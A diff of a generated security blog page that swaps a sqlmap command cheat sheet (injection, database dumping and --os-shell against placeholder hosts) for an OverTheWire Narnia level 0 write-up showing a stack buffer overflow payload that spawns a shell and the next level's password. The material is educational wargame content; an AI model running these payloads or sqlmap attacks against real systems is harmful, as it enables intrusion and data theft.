@@ -26,27 +26,27 @@
 
   <!-- Begin Jekyll SEO tag v2.7.1 -->
 <meta name="generator" content="Jekyll v4.2.0" />
-<meta property="og:title" content="SQLMap Command Reference" />
+<meta property="og:title" content="OTW Narnina Writeup" />
 <meta name="author" content="cyberwr3nch" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="SQLMap" />
-<meta property="og:description" content="SQLMap" />
-<link rel="canonical" href="https://cyberwr3nch.github.io/sqlmap/" />
-<meta property="og:url" content="https://cyberwr3nch.github.io/sqlmap/" />
+<meta name="description" content="Narnia" />
+<meta property="og:description" content="Narnia" />
+<link rel="canonical" href="https://cyberwr3nch.github.io/narnia-otw" />
+<meta property="og:url" content="https://cyberwr3nch.github.io/narnia-otw" />
 <meta property="og:site_name" content="DAMNEDSEC" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2021-04-04T20:34:19+08:00" />
+<meta property="article:published_time" content="2021-04-18T20:34:19+08:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="SQLMap Command Reference" />
+<meta property="twitter:title" content="OTW Narnina Writeup" />
 <meta name="twitter:site" content="@DhaneshSivasamy" />
 <meta name="twitter:creator" content="@cyberwr3nch" />
 <meta name="google-site-verification" content="google_meta_tag_verification" />
 <script type="application/ld+json">
-{"@type":"BlogPosting","headline":"SQLMap Command Reference","dateModified":"2021-04-04T20:34:19+08:00","datePublished":"2021-04-04T20:34:19+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://cyberwr3nch.github.io/sqlmap/"},"author":{"@type":"Person","name":"cyberwr3nch"},"url":"https://cyberwr3nch.github.io/sqlmap/","description":"SQLMap","@context":"https://schema.org"}</script>
+{"@type":"BlogPosting","headline":"OTW Narnina Writeup","dateModified":"2021-04-18T20:34:19+08:00","datePublished":"2021-04-18T20:34:19+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://cyberwr3nch.github.io/narnia-otw"},"author":{"@type":"Person","name":"cyberwr3nch"},"url":"https://cyberwr3nch.github.io/narnia-otw","description":"Narnia","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 
-  <title>SQLMap Command Reference | DAMNEDSEC
+  <title>OTW Narnina Writeup | DAMNEDSEC
   </title>
 
   <!--
@@ -288,7 +288,7 @@
       
 
         
-          <span>SQLMap Command Reference</span>
+          <span>OTW Narnina Writeup</span>
 
         
 
@@ -344,6 +344,20 @@
 
 
 
+  
+
+  
+
+  <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+  
+  
+
+  
+
+  
+
+
+
 <!-- return -->
 <div class="row">
 
@@ -351,7 +365,7 @@
 
     <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
 
-      <h1 data-toc-skip>SQLMap Command Reference</h1>
+      <h1 data-toc-skip>OTW Narnina Writeup</h1>
 
       <div class="post-meta text-muted d-flex flex-column">
         <!-- Published date and author -->
@@ -372,7 +386,7 @@
   
     data-toggle="tooltip"
     data-placement="bottom"
-    title="Sun, Apr  4, 2021,  8:34 PM +0800"
+    title="Sun, Apr 18, 2021,  8:34 PM +0800"
   
 
   
@@ -382,10 +396,10 @@
   
 
   
-    Apr  4
+    Apr 18
   
 
-  <i class="unloaded">2021-04-04T20:34:19+08:00</i>
+  <i class="unloaded">2021-04-18T20:34:19+08:00</i>
 
 </span>
 
@@ -410,7 +424,7 @@
 
 
 <!-- return element -->
-<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="332 words">1 min</span>
+<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="630 words">3 min</span>
 
 
           <!-- page views -->
@@ -424,18 +438,42 @@
 
         
 
-        <h1 id="sqlmap">SQLMap</h1>
-
-<h2 id="introduction">Introduction</h2>
+        <h1 id="narnia">Narnia</h1>
 
 <ul>
-  <li>Sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers</li>
-  <li>It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.<a href="http://sqlmap.org/"> From here</a></li>
+  <li><a href="https://overthewire.org/wargames/narnia/">This</a>  wargame is for the ones that want to learn basic exploitation.</li>
+  <li>You can see the most common bugs in this game and we’ve tried to make them easy to exploit.</li>
+  <li>You’ll get the source code of each level to make it easier for you to spot the vuln and abuse it.</li>
+  <li>The difficulty of the game is somewhere between Leviathan and Behemoth, but some of the levels could be quite tricky</li>
+  <li>Data for the levels can be found in /narnia/</li>
 </ul>
 
-<h2 id="syntax">Syntax</h2>
-
 <div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>Username: narnia0
+Password: narnia0
+</pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="narnia-0">Narnia 0</h2>
+
+<ul>
+  <li>Connect to the machine with ssh
+    <div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>ssh narnia0@narnia.labs.overthewire.org <span class="nt">-p2226</span>
+</pre></td></tr></tbody></table></code></div>    </div>
+  </li>
+  <li>The password for ssh login is <code class="language-plaintext highlighter-rouge">narnia0</code> as given by overthewire</li>
+  <li>The files are located at the <code class="language-plaintext highlighter-rouge">/narnina</code> folder</li>
+  <li>Executing the narnia0 file, to analyze its output</li>
+  <li>
+    <p>The narnia0 is expecting the user to provide input, lets provide a huge string to check overflowing of characters
+<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/narnia/narnia0-0.png" alt="overflown" />
+<em>Output address filled with x61’s</em></p>
+  </li>
+  <li>Taking a look at the source of narnia0</li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -460,69 +498,112 @@
 23
 24
 25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-</pre></td><td class="rouge-code"><pre><span class="c"># attacking parameters in GET request</span>
-sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str=a"</span>
+</pre></td><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="kt">long</span> <span class="n">val</span><span class="o">=</span><span class="mh">0x41414141</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
 
-<span class="c"># attacking parameters in POST request</span>
-sqlmap <span class="nt">-u</span> <span class="s2">"http://vulnpost.com/"</span> <span class="nt">--data</span><span class="o">=</span><span class="s2">"user_name=user&amp;password=password&amp;Submit_button=Submit"</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Correct val's value from 0x41414141 -&gt; 0xdeadbeef!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Here is your chance: "</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">"%24s"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
 
-<span class="c"># attacking against a specific parame</span>
-sqlmap <span class="nt">-u</span> <span class="s2">"http://vulnpost.com/"</span> <span class="nt">--data</span><span class="o">=</span><span class="s2">"user_name=user&amp;password=password&amp;Submit_button=Submit"</span> <span class="nt">-p</span> <span class="s2">"id"</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"buf: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"val: 0x%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">val</span><span class="p">);</span>
 
-<span class="c"># attacking with default options</span>
-sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str=a"</span> <span class="nt">--batch</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0xdeadbeef</span><span class="p">){</span>
+        <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span><span class="n">geteuid</span><span class="p">());</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"WAY OFF!!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
 
-<span class="c"># attacking on a session; after loggin in</span>
-sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str=a"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s2">"cookie1=val;cookie2=val"</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></div></div>
 
-<span class="c"># test sql injection is sites with ssl protection with a request file</span>
-sqlmap <span class="nt">-r</span> request_file <span class="nt">--force-ssl</span>
+<ul>
+  <li>From the source, we can obtain the buffer size, 20 and the input of 24 string characters is obtained from the users</li>
+  <li>The last extra 4 characters will overwrite the output of val, lets test it with python</li>
+</ul>
 
-<span class="c"># specify sql to perform extensive attack with default values</span>
-sqlmap <span class="nt">-r</span> request_file <span class="nt">--risk</span><span class="o">=</span>3 <span class="nt">--level</span><span class="o">=</span>5 <span class="nt">--batch</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>python <span class="nt">-c</span> <span class="s1">'print "a"*20 + "bbbb"'</span>
+</pre></td></tr></tbody></table></code></div></div>
 
-<span class="c"># prompt os shell if successfully exploited</span>
-sqlmap <span class="nt">-r</span> request_file <span class="nt">--risk</span><span class="o">=</span>3 <span class="nt">--level</span><span class="o">=</span>5 <span class="nt">--batch</span> <span class="nt">--force-ssl</span> <span class="nt">--os-shell</span>
+<ul>
+  <li>Now the output of value should change from x41x41x41x41 to <code class="language-plaintext highlighter-rouge">x62x62x62x62</code> which is the hexadecimal representation of ‘b’</li>
+  <li>Lets test it</li>
+</ul>
 
-<span class="c"># sql pwn flow</span>
-<span class="c"># database -&gt; tables -&gt; columns = Inforamtion</span>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/narnia/narnia0-1.png" alt="narnia0-1" />
+<em>val filled with 4 x62’s</em></p>
 
-<span class="c"># attack and enumerate the databases</span>
-sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str=a"</span> <span class="nt">--dbs</span>
+<ul>
+  <li>Looking back at the source, the application performs an if statement to compare the value of val (which we have access to modify)</li>
+  <li>We add the address <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> to overflow the application buffer and modify its “val” value</li>
+  <li>Since the address is of <code class="language-plaintext highlighter-rouge">little endian</code> type (reverse order 1234 will be reffered as 4321), we can perform this in multiple ways, some noteable ways are …</li>
+</ul>
 
-<span class="c"># attack on a specific database and enumerate tables</span>
-sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str=a"</span> <span class="nt">-D</span> &lt;database_name&gt; <span class="nt">--tables</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="c1"># addressing in reverse order
+</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'print "a"*20 + "</span><span class="se">\xef\xbe\xad\xde</span><span class="s">"'</span>
 
-<span class="c"># attack and dump the contents of the specified table in the database</span>
-sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str=a"</span> <span class="nt">-D</span> &lt;database_name&gt; <span class="nt">-T</span> &lt;table_name&gt; <span class="nt">--dump</span>
+<span class="c1"># with struct library
+</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import struct; print "a"*20 + struct.pack("&lt;I", 0xdeadbeef)'</span>
 
-<span class="c"># enumerate all the columns in the table in the database</span>
-sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str=a"</span> <span class="nt">-D</span> &lt;database_name&gt; <span class="nt">-T</span> &lt;table_name&gt; <span class="nt">--columns</span>
+<span class="c1"># with pwntools
+</span><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s">'from pwn import *; print(b"a"*20 + p32(0xdeadbeef))'</span>
+</pre></td></tr></tbody></table></code></div></div>
 
-<span class="c"># dump values from specific columns in the table from a specified database</span>
-sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str=a"</span> <span class="nt">-D</span> &lt;database_name&gt; <span class="nt">-T</span> &lt;table_name&gt; <span class="nt">-C</span> &lt;column_1, column_2&gt; <span class="nt">--dump</span> 
+<ul>
+  <li>Lets generate the output and provide as the input for the narnia0 binary</li>
+  <li>When the output of the python file is provided, we are able to successfully alter the value of the val. But, the first byte is set to null 0x00</li>
+</ul>
 
-<span class="c"># dumped files output will be sotred in </span>
-<span class="nb">cat</span> /home/<span class="nv">$USER</span>/.sqlmap/output/vuln.com/dump/&lt;file&gt;
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/narnia/narnia0-2.png" alt="try1" />
+<em>missing first byte</em></p>
+
+<ul>
+  <li>Lets try to pipe the output of the python file to the binary</li>
+  <li>Now we are completely able to overwite the value of val
+<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/narnia/narnia0-3.png" alt="try2" />
+<em>0xdeadbeef loaded in val</em></li>
+</ul>
+
+<blockquote>
+  <p>Why this piping worked and it fails when we provided the argument ?
+Python2 handles everything in bytes value, Therefore the generated address is of the bytes value.
+When the output is copied, it performs some type conversion which is converted as string. We can use hexdump to verfify this change
+<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/narnia/narnia0-4.png" alt="try3" />
+<em>differences in hexvalues</em></p>
+</blockquote>
+
+<ul>
+  <li>Now we are able to overwrite the value of <code class="language-plaintext highlighter-rouge">val</code> but we need a shell prompt as <code class="language-plaintext highlighter-rouge">narnia1</code></li>
+  <li>To access the shell as narnia1, we can make use of the <code class="language-plaintext highlighter-rouge">()</code> bash expansion which creates a subshell and executes the command and pipe it to the application</li>
+  <li>Normal commands like <code class="language-plaintext highlighter-rouge">whoami, ls</code> wont work cause we are still running as the user narni0</li>
+  <li>To access as narnia1 we can interput the stdin commands with <code class="language-plaintext highlighter-rouge">cat -</code> and print the output to stdout</li>
+  <li>Now the shell is interpretted as narnia1</li>
+</ul>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/narnia/narnia0-solve.png" alt="solve0" />
+<em>shell as narnia1</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /etc/narnia_pass/narnia1
+efeidiedae
 </pre></td></tr></tbody></table></code></div></div>
 
 
@@ -535,8 +616,8 @@ sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str
         <div class="post-meta mb-3">
           <i class="far fa-folder-open fa-fw mr-1"></i>
           
-            <a href='/categories/tools/'>tools</a>,
-            <a href='/categories/syntax/'>syntax</a>
+            <a href='/categories/writeups/'>writeups</a>,
+            <a href='/categories/ctf/'>ctf</a>
         </div>
         
 
@@ -545,23 +626,14 @@ sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str
         <div class="post-tags">
           <i class="fa fa-tags fa-fw mr-1"></i>
           
-          <a href="/tags/sqlmap/"
-            class="post-tag no-text-decoration" >sqlmap</a>
+          <a href="/tags/otw/"
+            class="post-tag no-text-decoration" >otw</a>
           
-          <a href="/tags/pentest/"
-            class="post-tag no-text-decoration" >pentest</a>
+          <a href="/tags/writeup/"
+            class="post-tag no-text-decoration" >writeup</a>
           
-          <a href="/tags/redteam/"
-            class="post-tag no-text-decoration" >redteam</a>
-          
-          <a href="/tags/tools/"
-            class="post-tag no-text-decoration" >tools</a>
-          
-          <a href="/tags/syntax/"
-            class="post-tag no-text-decoration" >syntax</a>
-          
-          <a href="/tags/cheatsheet/"
-            class="post-tag no-text-decoration" >cheatsheet</a>
+          <a href="/tags/bufferoverflow/"
+            class="post-tag no-text-decoration" >bufferoverflow</a>
           
           </div>
         
@@ -588,19 +660,19 @@ sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str
 
     
       
-        <a href="https://twitter.com/intent/tweet?text=SQLMap Command Reference - DAMNEDSEC&url=https://cyberwr3nch.github.io/sqlmap/" data-toggle="tooltip" data-placement="top"
+        <a href="https://twitter.com/intent/tweet?text=OTW Narnina Writeup - DAMNEDSEC&url=https://cyberwr3nch.github.io/narnia-otw" data-toggle="tooltip" data-placement="top"
           title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
           <i class="fa-fw fab fa-twitter"></i>
         </a>
     
       
-        <a href="https://www.facebook.com/sharer/sharer.php?title=SQLMap Command Reference - DAMNEDSEC&u=https://cyberwr3nch.github.io/sqlmap/" data-toggle="tooltip" data-placement="top"
+        <a href="https://www.facebook.com/sharer/sharer.php?title=OTW Narnina Writeup - DAMNEDSEC&u=https://cyberwr3nch.github.io/narnia-otw" data-toggle="tooltip" data-placement="top"
           title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
           <i class="fa-fw fab fa-facebook-square"></i>
         </a>
     
       
-        <a href="https://telegram.me/share?text=SQLMap Command Reference - DAMNEDSEC&url=https://cyberwr3nch.github.io/sqlmap/" data-toggle="tooltip" data-placement="top"
+        <a href="https://telegram.me/share?text=OTW Narnina Writeup - DAMNEDSEC&url=https://cyberwr3nch.github.io/narnia-otw" data-toggle="tooltip" data-placement="top"
           title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
           <i class="fa-fw fab fa-telegram"></i>
         </a>
@@ -1082,20 +1154,20 @@ sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str
   
 
   
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
 
 
 
@@ -1110,15 +1182,15 @@ sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str
   
     
     
-      
-      
-        
-        
-        
-      
-    
   
     
+    
+      
+      
+        
+        
+        
+      
     
   
 
@@ -1134,7 +1206,7 @@ sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str
       
       
       <div class="card">
-        <a href="/narnia-otw">
+        <a href="/sqlmap/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -1155,14 +1227,14 @@ sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str
   
 
   
-    Apr 18
+    Apr  4
   
 
-  <i class="unloaded">2021-04-18T20:34:19+08:00</i>
+  <i class="unloaded">2021-04-04T20:34:19+08:00</i>
 
 </span>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>OTW Narnina Writeup</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>SQLMap Command Reference</h3>
             <div class="text-muted small">
               <p>
                 
@@ -1171,12 +1243,13 @@ sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str
 
 
 
-                Narnia
+                SQLMap
+
+Introduction
 
 
-  This  wargame is for the ones that want to learn basic exploitation.
-  You can see the most common bugs in this game and we’ve tried to make them easy to exploit.
-  You’ll get the source...
+  Sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers
+  It comes ...
               </p>
             </div>
           </div>
@@ -1194,17 +1267,17 @@ sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str
 
 <div class="post-navigation d-flex justify-content-between">
   
-  <span class="btn btn-outline-primary disabled"
+  <a href="/sqlmap/" class="btn btn-outline-primary"
     prompt="Older">
-    <p>-</p>
-  </span>
+    <p>SQLMap Command Reference</p>
+  </a>
   
 
   
-  <a href="/narnia-otw" class="btn btn-outline-primary"
+  <span class="btn btn-outline-primary disabled"
     prompt="Newer">
-    <p>OTW Narnina Writeup</p>
-  </a>
+    <p>-</p>
+  </span>
   
 
 </div>
@@ -1218,6 +1291,18 @@ sqlmap <span class="nt">-u</span> <span class="s2">"http://vuln.com/id=1&amp;str
 
 </div> <!-- .row -->
 
+
+
+  <!--
+  image lazy load: https://github.com/ApoorvSaxena/lozad.js
+-->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script>
+
+<script type="text/javascript">
+  const imgs = document.querySelectorAll('#main > div.row:first-child > div:first-child img');
+  const observer = lozad(imgs);
+  observer.observe();
+</script>
 
 
 
